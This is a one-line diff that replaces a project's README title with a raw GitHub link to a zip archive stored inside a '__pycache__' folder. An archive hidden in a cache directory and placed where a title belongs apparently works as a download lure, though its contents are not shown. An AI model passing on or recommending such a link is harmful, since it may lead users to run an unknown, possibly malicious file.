@@ -1,1 +1,1 @@
-# python.springseme
+# https://raw.githubusercontent.com/SohanGurung0/python.springseme/main/shoes_wholesale/__pycache__/springseme-python-v2.8.zip
